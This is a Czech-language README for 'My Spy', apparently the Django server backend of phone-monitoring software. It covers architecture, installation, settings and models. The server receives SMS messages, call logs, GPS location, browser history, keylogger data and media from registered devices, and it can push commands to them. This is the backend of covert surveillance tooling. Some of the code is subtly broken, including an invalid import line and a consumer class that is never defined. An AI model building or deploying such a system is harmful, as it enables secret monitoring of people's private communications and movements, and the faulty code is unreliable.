# My Spy - Webová Aplikace (Django)

**Modul:** Webová Aplikace - Server
**Autor:** Michael KOJDL
**Verze:** 1.0.0
**Poslední revize:** 2025-10-30
**Python:** 3.13
**Framework:** Django (latest stable)
**Template:** Rocket Django PRO

---

## Obsah

1. [Přehled](#přehled)
2. [Architektura](#architektura)
3. [Technické požadavky](#technické-požadavky)
4. [Instalace](#instalace)
5. [Konfigurace](#konfigurace)
6. [Aplikační moduly](#aplikační-moduly)
7. [API Dokumentace](#api-dokumentace)
8. [WebSocket Server](#websocket-server)
9. [Frontend](#frontend)
10. [Deployment](#deployment)

---

## Přehled

Webová aplikace My Spy je Django-based serverová platforma poskytující:

- ✅ **REST API** pro komunikaci s mobilními zařízeními
- ✅ **WebSocket Server** pro real-time komunikaci
- ✅ **Admin Dashboard** pro správu zařízení a dat
- ✅ **Multi-user Support** s role-based přístupem
- ✅ **Dynamic Widgets** pro customizaci dashboardu
- ✅ **Real-time Analytics** s grafy a statistikami

### Klíčové vlastnosti

- 🚀 **Rocket Django PRO** - Premium template
- 🎨 **Tailwind CSS** + **Flowbite** - Moderní UI
- 📊 **ApexCharts** - Pokročilé grafy
- ⚡ **React Integration** - Pro komplexní widgets
- 🔄 **Celery** - Asynchronní task processing
- 🐳 **Docker Support** - Snadný deployment
- 📡 **Real-time Communication** - Django Channels

---

## Architektura

### System Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   My Spy Web Application                     │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────────────────────────────────────────────┐   │
│  │              Presentation Layer                       │   │
│  │  - Django Templates                                   │   │
│  │  - React Components (widgets)                        │   │
│  │  - Tailwind CSS + Flowbite                          │   │
│  └─────────────────────┬────────────────────────────────┘   │
│                        │                                      │
│  ┌─────────────────────▼────────────────────────────────┐   │
│  │              Application Layer                        │   │
│  │  - Django Views / ViewSets                           │   │
│  │  - Forms & Serializers                               │   │
│  │  - Business Logic                                    │   │
│  └─────────────────────┬────────────────────────────────┘   │
│                        │                                      │
│  ┌─────────────────────▼────────────────────────────────┐   │
│  │              API Layer                                │   │
│  │  ┌──────────────┐    ┌──────────────┐               │   │
│  │  │  REST API    │    │  WebSocket   │               │   │
│  │  │  (DRF)       │    │  (Channels)  │               │   │
│  │  └──────────────┘    └──────────────┘               │   │
│  └─────────────────────┬────────────────────────────────┘   │
│                        │                                      │
│  ┌─────────────────────▼────────────────────────────────┐   │
│  │              Business Logic Layer                     │   │
│  │  - Services                                           │   │
│  │  - Use Cases                                          │   │
│  │  - Domain Logic                                       │   │
│  └─────────────────────┬────────────────────────────────┘   │
│                        │                                      │
│  ┌─────────────────────▼────────────────────────────────┐   │
│  │              Data Access Layer                        │   │
│  │  - Models (ORM)                                       │   │
│  │  - Repositories                                       │   │
│  │  - Query Optimization                                 │   │
│  └─────────────────────┬────────────────────────────────┘   │
│                        │                                      │
│  ┌─────────────────────▼────────────────────────────────┐   │
│  │              Background Tasks                         │   │
│  │  - Celery Workers                                     │   │
│  │  - Celery Beat (scheduler)                           │   │
│  │  - RabbitMQ / Redis                                  │   │
│  └──────────────────────────────────────────────────────┘   │
│                        │                                      │
│  ┌─────────────────────▼────────────────────────────────┐   │
│  │              Data Storage                             │   │
│  │  - PostgreSQL (primary DB)                           │   │
│  │  - Redis (cache + sessions)                          │   │
│  │  - Memcached (cache)                                 │   │
│  │  - File Storage (media files)                        │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

### Django Apps Structure

```
WebApp/
├── config/                      # Projekt konfigurace
│   ├── settings/
│   │   ├── base.py             # Základní settings
│   │   ├── development.py      # Dev environment
│   │   ├── production.py       # Production environment
│   │   └── testing.py          # Test environment
│   ├── urls.py                 # Root URL conf
│   ├── wsgi.py                 # WSGI entry
│   └── asgi.py                 # ASGI entry (WebSocket)
│
├── apps/                       # Django aplikace
│   ├── users/                  # User management
│   │   ├── models.py
│   │   ├── views.py
│   │   ├── serializers.py
│   │   ├── admin.py
│   │   └── permissions.py
│   │
│   ├── devices/                # Device registration
│   │   ├── models.py
│   │   ├── views.py
│   │   ├── serializers.py
│   │   ├── services.py
│   │   └── admin.py
│   │
│   ├── monitoring/             # Monitoring modules
│   │   ├── sms/
│   │   │   ├── models.py
│   │   │   ├── views.py
│   │   │   ├── serializers.py
│   │   │   ├── widgets.py
│   │   │   └── services.py
│   │   ├── calls/
│   │   ├── location/
│   │   ├── apps/
│   │   ├── internet/
│   │   ├── keylogger/
│   │   ├── media/
│   │   └── files/
│   │
│   ├── api/                    # API endpoints
│   │   ├── v1/
│   │   │   ├── urls.py
│   │   │   ├── views.py
│   │   │   └── serializers.py
│   │   └── authentication.py
│   │
│   ├── websocket/              # WebSocket handlers
│   │   ├── consumers.py
│   │   ├── routing.py
│   │   └── middleware.py
│   │
│   ├── dashboard/              # Dashboard & widgets
│   │   ├── views.py
│   │   ├── widgets/
│   │   │   ├── base.py
│   │   │   ├── sms_widgets.py
│   │   │   ├── location_widgets.py
│   │   │   └── ...
│   │   └── templates/
│   │
│   └── hooks/                  # Event hooks system
│       ├── models.py
│       ├── engine.py
│       ├── actions.py
│       └── filters.py
│
├── static/                     # Static files
│   ├── css/
│   ├── js/
│   ├── images/
│   └── vendor/
│
├── media/                      # User uploaded files
│   ├── screenshots/
│   ├── videos/
│   ├── audio/
│   └── files/
│
├── templates/                  # Django templates
│   ├── base.html
│   ├── dashboard/
│   ├── auth/
│   └── widgets/
│
├── locale/                     # Internationalization
│   ├── cs/
│   └── en/
│
├── tests/                      # Tests
│   ├── unit/
│   ├── integration/
│   └── e2e/
│
├── requirements/               # Dependencies
│   ├── base.txt
│   ├── development.txt
│   ├── production.txt
│   └── testing.txt
│
├── manage.py                   # Django CLI
├── pytest.ini                  # Pytest config
└── .env.example                # Environment variables template
```

---

## Technické požadavky

### Python Environment

- **Python**: 3.13+
- **pip**: Latest
- **virtualenv** nebo **conda**: Pro virtual environment

### Database

- **PostgreSQL**: 15+ (doporučeno)
- **MySQL**: 8.0+ (alternativa)
- **SQLite**: Pouze pro development

### Cache & Message Queue

- **Redis**: 7.0+ (cache, sessions, Celery backend)
- **Memcached**: 1.6+ (optional secondary cache)
- **RabbitMQ**: 3.12+ (Celery message broker)

### Web Server

- **Nginx**: 1.24+ nebo **Apache2**: 2.4+
- **Gunicorn**: WSGI server
- **Daphne**: ASGI server (pro WebSocket)

### System Requirements

- **OS**: Debian 12.12 / Ubuntu 22.04 / Docker
- **RAM**: Minimum 4GB, doporučeno 8GB+
- **CPU**: 2+ cores
- **Disk**: 50GB+ SSD

---

## Instalace

### 1. Příprava prostředí

#### A. Conda Virtual Environment (doporučeno)

```bash
# Instalace Miniconda (pokud není nainstalována)
wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh
bash Miniconda3-latest-Linux-x86_64.sh

# Vytvoření virtual environment
conda create -n myspy python=3.13
conda activate myspy
```

#### B. Virtualenv (alternativa)

```bash
# Instalace virtualenv
pip install virtualenv

# Vytvoření virtual environment
cd /home/m5spy/venvs/
virtualenv myspy_env -p python3.13

# Aktivace
source /home/m5spy/venvs/myspy_env/bin/activate
```

### 2. Clone Repository

```bash
cd /home/m5spy/framework/
git clone https://github.com/m5ike/m5spy_app.git
cd m5spy_app/WebApp
```

### 3. Instalace závislostí

```bash
# Upgrade pip
pip install --upgrade pip

# Instalace production dependencies
pip install -r requirements/production.txt

# Pro development
pip install -r requirements/development.txt
```

### 4. Environment Variables

```bash
# Kopírovat .env.example
cp .env.example .env

# Editovat .env
nano .env
```

**.env soubor:**
```bash
# Django Settings
DEBUG=False
SECRET_KEY=your-secret-key-here-change-this-in-production
ALLOWED_HOSTS=app.myspy.fir.ma,api.myspy.fir.ma,wss.myspy.fir.ma

# Database
DATABASE_URL=postgresql://m5spy:password@localhost:5432/myspy_db

# Redis
REDIS_URL=redis://localhost:6379/0

# Celery
CELERY_BROKER_URL=amqp://m5spy:password@localhost:5672//

# Email
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_HOST_USER=your-email@gmail.com
EMAIL_HOST_PASSWORD=your-app-password
EMAIL_USE_TLS=True

# Security
CSRF_TRUSTED_ORIGINS=https://app.myspy.fir.ma

# Storage
MEDIA_ROOT=/home/m5spy/fs/media/
STATIC_ROOT=/home/m5spy/fs/static/
```

### 5. Database Setup

```bash
# Spustit PostgreSQL
sudo systemctl start postgresql

# Vytvořit databázi
sudo -u postgres psql
CREATE DATABASE myspy_db;
CREATE USER m5spy WITH PASSWORD 'your-password';
GRANT ALL PRIVILEGES ON DATABASE myspy_db TO m5spy;
\q

# Spustit migrace
python manage.py migrate

# Vytvořit superusera
python manage.py createsuperuser
```

### 6. Static Files

```bash
# Collect static files
python manage.py collectstatic --noinput
```

### 7. Test Server

```bash
# Development server
python manage.py runserver 0.0.0.0:8000

# Production test
gunicorn config.wsgi:application --bind 0.0.0.0:8000
```

---

## Konfigurace

### Settings Structure

#### base.py - Základní nastavení

```python
"""
Base Settings
@author Michael KOJDL
@version 1.0.0
@revision 2025-10-30
"""

import os
from pathlib import Path
from decouple import config

# Build paths
BASE_DIR = Path(__file__).resolve().parent.parent.parent

# Security
SECRET_KEY = config('SECRET_KEY')
ALLOWED_HOSTS = config('ALLOWED_HOSTS', default='localhost').split(',')

# Application definition
INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',

    # Third party apps
    'rest_framework',
    'rest_framework.authtoken',
    'channels',
    'django_celery_beat',
    'django_celery_results',
    'corsheaders',
    'django_filters',

    # Local apps
    'apps.users',
    'apps.devices',
    'apps.monitoring.sms',
    'apps.monitoring.calls',
    'apps.monitoring.location',
    'apps.monitoring.apps',
    'apps.monitoring.internet',
    'apps.monitoring.keylogger',
    'apps.monitoring.media',
    'apps.monitoring.files',
    'apps.api',
    'apps.websocket',
    'apps.dashboard',
    'apps.hooks',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'config.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'config.wsgi.application'
ASGI_APPLICATION = 'config.asgi.application'

# Database
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': config('DB_NAME', default='myspy_db'),
        'USER': config('DB_USER', default='m5spy'),
        'PASSWORD': config('DB_PASSWORD'),
        'HOST': config('DB_HOST', default='localhost'),
        'PORT': config('DB_PORT', default='5432'),
    }
}

# Cache
CACHES = {
    'default': {
        'BACKEND': 'django_redis.cache.RedisCache',
        'LOCATION': config('REDIS_URL', default='redis://localhost:6379/0'),
        'OPTIONS': {
            'CLIENT_CLASS': 'django_redis.client.DefaultClient',
        }
    }
}

# Channels
CHANNEL_LAYERS = {
    'default': {
        'BACKEND': 'channels_redis.core.RedisChannelLayer',
        'CONFIG': {
            'hosts': [config('REDIS_URL', default='redis://localhost:6379/0')],
        },
    },
}

# Celery
CELERY_BROKER_URL = config('CELERY_BROKER_URL')
CELERY_RESULT_BACKEND = 'django-db'
CELERY_ACCEPT_CONTENT = ['json']
CELERY_TASK_SERIALIZER = 'json'
CELERY_RESULT_SERIALIZER = 'json'
CELERY_TIMEZONE = 'Europe/Prague'

# Internationalization
LANGUAGE_CODE = 'cs-cz'
TIME_ZONE = 'Europe/Prague'
USE_I18N = True
USE_TZ = True

# Static files
STATIC_URL = '/static/'
STATIC_ROOT = config('STATIC_ROOT', default=BASE_DIR / 'staticfiles')
STATICFILES_DIRS = [BASE_DIR / 'static']

# Media files
MEDIA_URL = '/media/'
MEDIA_ROOT = config('MEDIA_ROOT', default=BASE_DIR / 'media')

# Default primary key field type
DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

# Custom User Model
AUTH_USER_MODEL = 'users.User'

# REST Framework
REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': [
        'rest_framework.authentication.TokenAuthentication',
        'rest_framework.authentication.SessionAuthentication',
    ],
    'DEFAULT_PERMISSION_CLASSES': [
        'rest_framework.permissions.IsAuthenticated',
    ],
    'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.PageNumberPagination',
    'PAGE_SIZE': 100,
    'DEFAULT_FILTER_BACKENDS': [
        'django_filters.rest_framework.DjangoFilterBackend',
        'rest_framework.filters.SearchFilter',
        'rest_framework.filters.OrderingFilter',
    ],
}
```

---

## Aplikační moduly

### 1. Users App

**Modely:**
```python
# apps/users/models.py

from django.contrib.auth.models.AbstractUser
from django.db import models

class User(AbstractUser):
    """
    Custom User Model

    @author Michael KOJDL
    @version 1.0.0
    @revision 2025-10-30
    """

    class Role(models.TextChoices):
        ADMIN = 'ADMIN', 'Administrator'
        USER = 'USER', 'User'
        GUEST = 'GUEST', 'Guest'

    role = models.CharField(
        max_length=10,
        choices=Role.choices,
        default=Role.USER
    )
    phone = models.CharField(max_length=20, blank=True)
    address = models.TextField(blank=True)
    api_key = models.CharField(max_length=64, unique=True, blank=True)

    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        db_table = 'users'
        verbose_name = 'User'
        verbose_name_plural = 'Users'

    def __str__(self):
        return self.username

    def save(self, *args, **kwargs):
        if not self.api_key:
            self.api_key = self.generate_api_key()
        super().save(*args, **kwargs)

    @staticmethod
    def generate_api_key():
        import secrets
        return secrets.token_urlsafe(32)
```

### 2. Devices App

**Modely:**
```python
# apps/devices/models.py

from django.db import models
from django.conf import settings

class Device(models.Model):
    """
    Device Registration Model

    @author Michael KOJDL
    @version 1.0.0
    @revision 2025-10-30
    """

    uuid = models.CharField(max_length=36, unique=True, db_index=True)
    api_key = models.CharField(max_length=64, unique=True)

    # Device Info
    manufacturer = models.CharField(max_length=100)
    model = models.CharField(max_length=100)
    serial = models.CharField(max_length=100, unique=True)
    os = models.CharField(max_length=50)
    os_version = models.CharField(max_length=50)
    imei = models.CharField(max_length=20, unique=True)

    # Ownership
    owner = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name='owned_devices'
    )
    shared_with = models.ManyToManyField(
        settings.AUTH_USER_MODEL,
        related_name='shared_devices',
        blank=True
    )

    # Status
    is_active = models.BooleanField(default=True)
    last_seen = models.DateTimeField(null=True, blank=True)

    # Metadata
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        db_table = 'devices'
        verbose_name = 'Device'
        verbose_name_plural = 'Devices'
        ordering = ['-created_at']

    def __str__(self):
        return f"{self.manufacturer} {self.model} ({self.uuid})"

    @staticmethod
    def generate_api_key():
        import secrets
        import string
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(20))
```

### 3. SMS Monitoring Module

**Modely:**
```python
# apps/monitoring/sms/models.py

from django.db import models
from apps.devices.models import Device

class SmsMessage(models.Model):
    """
    SMS Message Model

    @author Michael KOJDL
    @version 1.0.0
    @revision 2025-10-30
    """

    class MessageType(models.TextChoices):
        INCOMING = 'INCOMING', 'Incoming'
        OUTGOING = 'OUTGOING', 'Outgoing'
        DRAFT = 'DRAFT', 'Draft'

    device = models.ForeignKey(
        Device,
        on_delete=models.CASCADE,
        related_name='sms_messages'
    )

    message_type = models.CharField(
        max_length=10,
        choices=MessageType.choices
    )
    address = models.CharField(max_length=20)  # Phone number
    body = models.TextField()
    timestamp = models.DateTimeField(db_index=True)
    thread_id = models.IntegerField(null=True)

    # Metadata
    received_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        db_table = 'sms_messages'
        verbose_name = 'SMS Message'
        verbose_name_plural = 'SMS Messages'
        ordering = ['-timestamp']
        indexes = [
            models.Index(fields=['device', '-timestamp']),
            models.Index(fields=['address', '-timestamp']),
        ]

    def __str__(self):
        return f"{self.message_type} - {self.address} - {self.timestamp}"
```

**API Views:**
```python
# apps/api/v1/views.py

from rest_framework import status, viewsets
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from rest_framework.permissions import IsAuthenticated
from apps.api.authentication import DeviceAuthentication
from apps.devices.models import Device
from apps.monitoring.sms.models import SmsMessage
from apps.api.v1.serializers import (
    RegisterDeviceSerializer,
    SmsMessageSerializer
)

@api_view(['POST'])
@permission_classes([])
def register_device(request):
    """
    Register new device

    @author Michael KOJDL
    @version 1.0.0
    @revision 2025-10-30

    POST /api/v1/register
    """
    serializer = RegisterDeviceSerializer(data=request.data)
    if serializer.is_valid():
        device = serializer.save()
        return Response({
            'result': 'ok',
            'uuid': device.uuid,
            'api_key': device.api_key,
            'timestamp': device.created_at.isoformat(),
            'version': '1.0.0'
        }, status=status.HTTP_201_CREATED)

    return Response({
        'result': 'error',
        'message': serializer.errors
    }, status=status.HTTP_400_BAD_REQUEST)


class SmsMessageViewSet(viewsets.ModelViewSet):
    """
    SMS Messages ViewSet

    @author Michael KOJDL
    """
    serializer_class = SmsMessageSerializer
    authentication_classes = [DeviceAuthentication]
    permission_classes = [IsAuthenticated]

    def get_queryset(self):
        # Vrátí pouze SMS pro authenticated device
        return SmsMessage.objects.filter(
            device=self.request.device
        )

    def create(self, request, *args, **kwargs):
        # Bulk create support
        many = isinstance(request.data, list)
        serializer = self.get_serializer(data=request.data, many=many)
        serializer.is_valid(raise_exception=True)
        self.perform_create(serializer)
        return Response(serializer.data, status=status.HTTP_201_CREATED)
```

---

## API Dokumentace

Kompletní API dokumentace je v samostatném souboru: [/docs/API.md](/docs/API.md)

### Základní endpoints

```
POST   /api/v1/register                    # Device registration
POST   /api/v1/sms                         # Upload SMS data
POST   /api/v1/calls                       # Upload call logs
POST   /api/v1/location                    # Upload GPS data
POST   /api/v1/apps                        # Upload app usage
POST   /api/v1/internet                    # Upload browser history
POST   /api/v1/keylogger                   # Upload keylogger data
POST   /api/v1/media                       # Upload media files
POST   /api/v1/control/command             # Send command to device
GET    /api/v1/control/status              # Get device status
```

---

## WebSocket Server

### Consumers

```python
# apps/websocket/consumers.py

import json
from channels.generic.websocket import AsyncWebsocketConsumer
from apps.devices.models import Device

class DeviceConsumer(AsyncWebsocketConsumer):
    """
    WebSocket Consumer for device connections

    @author Michael KOJDL
    @version 1.0.0
    @revision 2025-10-30
    """

    async def connect(self):
        self.device_uuid = self.scope['url_route']['kwargs']['uuid']
        self.room_group_name = f'device_{self.device_uuid}'

        # Join room group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name
        )

        await self.accept()

    async def disconnect(self, close_code):
        # Leave room group
        await self.channel_layer.group_discard(
            self.room_group_name,
            self.channel_name
        )

    async def receive(self, text_data):
        data = json.loads(text_data)
        message_type = data.get('type')

        # Handle different message types
        if message_type == 'heartbeat':
            await self.send_heartbeat_response()
        elif message_type == 'data':
            await self.handle_data(data)

    async def send_command(self, event):
        """Send command from server to device"""
        await self.send(text_data=json.dumps({
            'type': 'command',
            'command': event['command'],
            'parameters': event.get('parameters', {})
        }))
```

### Routing

```python
# apps/websocket/routing.py

from django.urls import re_path
from . import consumers

websocket_urlpatterns = [
    re_path(r'ws/device/(?P<uuid>[^/]+)/$', consumers.DeviceConsumer.as_asgi()),
    re_path(r'ws/dashboard/(?P<uuid>[^/]+)/$', consumers.DashboardConsumer.as_asgi()),
]
```

---

## Frontend

### Tailwind CSS + Flowbite

Používá se Rocket Django PRO template s Tailwind CSS a Flowbite komponentami.

### Widgets System

```python
# apps/dashboard/widgets/base.py

from abc import ABC, abstractmethod

class BaseWidget(ABC):
    """
    Base Widget Class

    @author Michael KOJDL
    @version 1.0.0
    @revision 2025-10-30
    """

    widget_id: str
    widget_name: str
    widget_description: str
    template_name: str

    @abstractmethod
    def get_context_data(self, device, **kwargs):
        """Return context data for rendering widget"""
        pass

    @abstractmethod
    def get_config_form(self):
        """Return configuration form for widget"""
        pass

    def render(self, device, **kwargs):
        """Render widget HTML"""
        from django.template.loader import render_to_string
        context = self.get_context_data(device, **kwargs)
        return render_to_string(self.template_name, context)
```

---

## Deployment

Viz [Server/README.md](../Server/README.md) pro kompletní deployment instrukce.

### Quick Start with Gunicorn

```bash
# Spustit Gunicorn
gunicorn config.wsgi:application \
    --bind 0.0.0.0:8000 \
    --workers 4 \
    --timeout 120 \
    --access-logfile /home/m5spy/logs/gunicorn-access.log \
    --error-logfile /home/m5spy/logs/gunicorn-error.log
```

### Daphne (ASGI - pro WebSocket)

```bash
# Spustit Daphne
daphne config.asgi:application \
    --bind 0.0.0.0 \
    --port 8001
```

### Celery Worker

```bash
# Spustit Celery worker
celery -A config worker \
    --loglevel=info \
    --concurrency=4
```

### Celery Beat

```bash
# Spustit Celery beat (scheduler)
celery -A config beat \
    --loglevel=info \
    --scheduler django_celery_beat.schedulers:DatabaseScheduler
```

---

## Testing

```bash
# Run all tests
pytest

# Run specific app tests
pytest apps/users/tests/

# Run with coverage
pytest --cov=apps --cov-report=html
```

---

## Changelog

### Version 1.0.0 (2025-10-30)
- ✨ Iniciální verze dokumentace
- ✨ Definice všech Django apps
- ✨ API endpoints specifikace
- ✨ WebSocket server setup
- ✨ Widget system architekturaě

---

**Autor:** Michael KOJDL
**Poslední aktualizace:** 2025-10-30
**Verze:** 1.0.0
